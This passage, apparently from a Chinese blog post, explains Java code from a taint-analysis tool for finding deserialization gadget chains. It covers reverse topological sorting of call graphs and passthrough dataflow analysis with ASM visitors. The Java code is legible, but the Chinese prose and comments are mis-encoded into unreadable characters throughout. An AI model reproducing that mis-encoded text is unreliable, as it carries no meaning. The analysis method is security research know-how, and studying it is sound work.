å°†å…¶è¿”å›å€¼ä½œä¸ºè‡ªå·±çš„è¿”å›ç»“æœï¼Œæ‰€ä»¥æœ€åå¯ä»¥åˆ¤å®š parentMethod çš„å‚æ•° arg å’Œè¿”å›å€¼æœ‰å…³ã€‚</p><p>å› æ­¤è¦å…ˆåˆ¤æ–­å­æ–¹æ³•è¿”å›å€¼ä¸å­æ–¹æ³•å‚æ•°çš„å…³ç³»ï¼Œå†åˆ¤æ–­çˆ¶æ–¹æ³•è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»ï¼Œè¿™æ ·æ‰èƒ½åˆ¤æ–­æ–¹æ³•å‚æ•°ä¸è¿”å›å€¼çš„å…³ç³»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parentMethod</span><span class="params">(String arg)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">vul</span> <span class="operator">=</span> Obj.childMethod(arg);</span><br><span class="line">    <span class="keyword">return</span> vul;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">childMethod</span><span class="params">(String carg)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> carg.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†å®ç°å…ˆåˆ¤æ–­å­æ–¹æ³•ååˆ¤æ–­çˆ¶æ–¹æ³•ï¼Œè¿™é‡Œå°±éœ€è¦è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼Œé€†æ‹“æ‰‘æ’åºä½¿ç”¨æ ˆå®ç°ï¼Œå˜é‡ <code>dfsStack</code> å’Œ <code>visitedNodes</code> ç”¨äºé¿å…å½¢æˆç¯ï¼ŒåŒæ—¶ <code>visitedNodes</code> è¿˜å¯ä»¥é¿å…é‡å¤æ’åºï¼Œå…·ä½“çš„æ’åºæ“ä½œç”± <code>dfsTsort</code> å®ç°ï¼Œæ‰€æœ‰æ–¹æ³•è°ƒç”¨æ•´åˆä¸ºä¸€ä¸ªé›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¹æ–¹æ³•çš„è°ƒç”¨å…³ç³»è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼ˆæŒ‰åç§°é€†åºï¼‰</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">    <span class="comment">// æ‹·è´æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">        MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> entry.getKey(); <span class="comment">// æ–¹æ³•</span></span><br><span class="line">        outgoingReferences.put(method, <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(entry.getValue()));    <span class="comment">// è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Topological sort methods</span></span><br><span class="line">    LOGGER.debug(<span class="string">&quot;Performing topological sort...&quot;</span>);</span><br><span class="line">    Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();     <span class="comment">// é¿å…å½¢æˆç¯</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(); <span class="comment">// åœ¨è°ƒç”¨é“¾å‡ºç°é‡åˆæ—¶ï¼Œé¿å…é‡å¤æ’åº</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(outgoingReferences.size());    <span class="comment">// æ–¹æ³•è°ƒç”¨é›†åˆ</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">        <span class="comment">// éå†é›†åˆä¸­çš„èµ·å§‹æ–¹æ³•ï¼Œè¿›è¡Œé€’å½’æœç´¢ï¼ˆDFSï¼‰ï¼Œç»è¿‡é€†æ‹“æ‰‘æ’åºï¼Œè°ƒç”¨é“¾çš„æœ€æœ«ç«¯æ’åœ¨æœ€å‰é¢ï¼Œ</span></span><br><span class="line">        <span class="comment">// åç»­è¿›è¡Œå‚æ•°ã€è¿”å›å€¼ã€è°ƒç”¨é“¾ä¹‹é—´çš„æ±¡ç‚¹ä¼ é€’åˆ†æ</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.debug(String.format(<span class="string">&quot;Outgoing references %d, sortedMethods %d&quot;</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é€†æ‹“æ‰‘æ’åºåçš„æ–¹æ³•è°ƒç”¨é›†åˆ</span></span><br><span class="line">    <span class="keyword">return</span> sortedMethods;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€†æ‹“æ‰‘æ’åºçš„å…·ä½“å®ç°</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outgoingReferences æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods      é€†æ‹“æ‰‘æ’åºåçš„æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> visitedNodes       å·²æ’åºçš„æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stack              æ ˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> node               å¾…æ’åºçš„èµ·å§‹æ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span><br><span class="line"><span class="params">                             List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span><br><span class="line"><span class="params">                             Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> &#123;</span><br><span class="line">    <span class="comment">// é˜²æ­¢åœ¨éå†ä¸€æ¡è°ƒç”¨é“¾ä¸­è¿›å…¥å¾ªç¯</span></span><br><span class="line">    <span class="keyword">if</span> (stack.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜²æ­¢å¯¹æŸä¸ªæ–¹æ³•åŠè¢«è°ƒæ–¹æ³•é‡å¤æ’åº</span></span><br><span class="line">    <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®èµ·å§‹æ–¹æ³•ï¼Œå–å‡ºè¢«è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">    <span class="keyword">if</span> (outgoingRefs == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stack.add(node);    <span class="comment">// å…¥æ ˆï¼Œé¿å…é€’å½’æ­»å¾ªç¯</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123; <span class="comment">// å¯¹è¢«è°ƒç”¨æ–¹æ³•é€’å½’è¿›è¡Œæ’åº</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">    &#125;</span><br><span class="line">    stack.remove(node); <span class="comment">// å‡ºæ ˆï¼Œæ–¹æ³•æ’åºå®Œæ¯•</span></span><br><span class="line">    visitedNodes.add(node);     <span class="comment">// è®°å½•å·²è®¿é—®çš„æ–¹æ³•ï¼Œåœ¨é€’å½’é‡åˆ°é‡å¤æ–¹æ³•æ—¶å¯ä»¥è·³è¿‡</span></span><br><span class="line">    sortedMethods.add(node);    <span class="comment">// è®°å½•å·²æ’åºçš„æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨ <code>calculatePassthroughDataflow</code> æ–¹æ³•åˆ¤æ–­æ¯ä¸ªæ–¹æ³•çš„è¿”å›å€¼ä¸å‚æ•°å…³ç³»ï¼Œé¦–å…ˆè·³è¿‡é™æ€ä»£ç å—ï¼Œç„¶ååˆ©ç”¨ asm çš„è®¿é—®è€…å¯¹é€†æ‹“æ‰‘æ’åºå¾—åˆ°çš„æ–¹æ³•é›†åˆè¿›è¡Œéå†å’Œåˆ†æåˆ¤æ–­ã€‚</p><ul><li>é™æ€ä»£ç å—åœ¨ç±»åŠ è½½æ—¶è°ƒç”¨ï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸”ä¼˜å…ˆäºä¸»å‡½æ•°ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ†ææ–¹æ³•è°ƒç”¨é›†åˆï¼Œè·å–æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceByName ç±»èµ„æºé›†åˆ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classMap            ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap      ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods       æ‰€æœ‰æ–¹æ³•é›†åˆï¼ˆç»è¿‡é€†æ‹“æ‰‘æ’åºï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> serializableDecider åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                      Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                      InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                      List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                      SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•ã€ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;</span><br><span class="line">        <span class="comment">// è·³è¿‡ static é™æ€åˆå§‹åŒ–ä»£ç ï¼ˆé™æ€ä»£ç å—ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;&lt;clinit&gt;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ–¹æ³•æ‰€å±ç±»çš„ç±»èµ„æº</span></span><br><span class="line">        ClassResourceEnumerator.<span class="type">ClassResource</span> <span class="variable">classResource</span> <span class="operator">=</span> classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> classResource.getInputStream()) &#123;    <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);  <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * classMap             ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">                 * inheritanceMap       ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment">                 * passthroughDataflow  æ•°æ®æµä¿¡æ¯ï¼Œåˆå§‹ä¸ºç©º</span></span><br><span class="line"><span class="comment">                 * serializableDecider  åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line"><span class="comment">                 * Opcodes.ASM6         ASM API ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">                 * method               å¾…è§‚å¯Ÿçš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="comment">// ç»§æ‰¿ asm çš„ ClassVisitor(MethodVisitor) å®ç°å¯¹ç±»æ–‡ä»¶çš„è§‚å¯Ÿï¼Œè®°å½•ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">                <span class="type">PassthroughDataflowClassVisitor</span> <span class="variable">cv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDataflowClassVisitor</span>(classMap, inheritanceMap,</span><br><span class="line">                        passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitMethod</span></span><br><span class="line">                cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ç¼“å­˜æ–¹æ³•çš„å“ªäº›å‚æ•°ä¼šå½±å“è¿”å›å€¼</span></span><br><span class="line">                passthroughDataflow.put(method, cv.getReturnTaint());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Unable to analyze &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowClassVisitor</code> ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™ <code>visit</code> è®°å½•æ–¹æ³•æ‰€å±ç±»çš„åç§°ï¼Œé‡å†™ <code>visitMethod</code> å¯¹å¾…è§‚å¯Ÿçš„æ–¹æ³•ç”¨ <code>PassthroughDataflowMethodVisitor</code> åˆ¤æ–­è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»ï¼Œæ–¹æ³• <code>getReturnTaint</code> è¿”å›èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PassthroughDataflowClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap;    <span class="comment">// ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle methodToVisit;     <span class="comment">// å¾…è§‚å¯Ÿçš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;            <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;    <span class="comment">// ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> PassthroughDataflowMethodVisitor passthroughDataflowMethodVisitor;  <span class="comment">// æ–¹æ³•è®¿é—®è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PassthroughDataflowClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                           InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span><br><span class="line"><span class="params">                                           SerializableDecider serializableDecider, <span class="type">int</span> api, MethodReference.Handle methodToVisit)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(api); <span class="comment">// ASM API ç‰ˆæœ¬</span></span><br><span class="line">        <span class="built_in">this</span>.classMap = classMap;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="built_in">this</span>.methodToVisit = methodToVisit;</span><br><span class="line">        <span class="built_in">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature,</span></span><br><span class="line"><span class="params">                      String superName, String[] interfaces)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="built_in">this</span>.name = name;   <span class="comment">// è®°å½•ç±»å</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä¸æ˜¯å¾…è§‚å¯Ÿæ–¹æ³•çš„æ‰€å±ç±»</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.name.equals(methodToVisit.getClassReference().getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Expecting to visit &quot;</span> + methodToVisit.getClassReference().getName() + <span class="string">&quot; but instead got &quot;</span> + <span class="built_in">this</span>.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                     String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="comment">// ä¸æ˜¯å¾…è§‚å¯Ÿæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (!name.equals(methodToVisit.getName()) || !desc.equals(methodToVisit.getDesc())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Constructing passthroughDataflowMethodVisitor twice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œè¿”å›æ–°çš„æ–¹æ³•è§‚å¯Ÿè€…</span></span><br><span class="line">        <span class="comment">// å¦‚æœç±»è§‚å¯Ÿè€…çš„ cv å˜é‡ä¸ºç©ºï¼Œåˆ™è¿”å› nullï¼Œå¦åˆ™è¿”å› cv.visitMethod</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ–¹æ³•è®¿é—®è€…ï¼Œåˆ¤æ–­æ–¹æ³•è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»</span></span><br><span class="line">        <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisitCode -&gt; visitInsn -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        passthroughDataflowMethodVisitor = <span class="keyword">new</span> <span class="title class_">PassthroughDataflowMethodVisitor</span>(</span><br><span class="line">                classMap, inheritanceMap, <span class="built_in">this</span>.passthroughDataflow, serializableDecider,</span><br><span class="line">                api, mv, <span class="built_in">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(passthroughDataflowMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¿”å›èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Integer&gt; <span class="title function_">getReturnTaint</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Never constructed the passthroughDataflowmethodVisitor!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflowMethodVisitor.returnTaint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowMethodVisitor</code> ç»§æ‰¿ <code>TaintTrackingMethodVisitor</code> å®ç°ï¼Œé‡å†™äº†å…¶ä¸­çš„ 4 ä¸ªè®¿é—®è€…æ–¹æ³•ï¼š</p><ul><li>visitCodeï¼šå¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®ï¼ŒæŠŠå‚æ•°å…¨éƒ¨å­˜åˆ°æœ¬åœ°å˜é‡è¡¨</li><li>visitInsnï¼šè®¿é—®é›¶æ“ä½œæ•°çš„æŒ‡ä»¤ï¼Œè¿™é‡Œåªåˆ†æè¿”å›æŒ‡ä»¤</li><li>visitFieldInsnï¼šè®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤</li><li>visitMethodInsnï¼šè®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</li></ul><p>ä½†æ˜¯ TaintTrackingMethodVisitor ç»§æ‰¿ asm çš„ MethodVisitor å¹¶é‡å†™äº†å¤§é‡çš„æ–¹æ³•ï¼Œæ¨¡æ‹Ÿ JVM 